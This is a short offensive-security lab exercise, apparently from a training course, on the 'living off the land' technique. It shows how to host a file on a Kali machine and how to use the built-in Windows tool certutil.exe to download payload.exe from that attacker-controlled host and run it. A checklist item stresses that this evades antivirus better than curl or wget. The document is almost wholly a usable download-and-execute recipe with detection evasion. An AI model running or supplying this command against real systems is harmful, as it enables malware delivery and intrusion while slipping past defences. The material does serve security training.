# Lab 2: Living off the Land (LotL)

## Goal: Use a legitimate Windows tool to download a payload.

## Tool: `certutil.exe`
Certutil is a built-in Windows tool for managing certificates. However, it can also download files from the web.

## Steps:
1. Host a file on your Kali machine: `python3 -m http.server 80`
2. On the Windows target, run:
   `certutil.exe -urlcache -split -f http://<kali_ip>/payload.exe payload.exe`
3. Run the payload.

## Success Check:
- [ ] Successfully downloaded a file using a trusted system tool.
- [ ] Understand why this is harder for AV to detect than a direct `curl` or `wget` command.
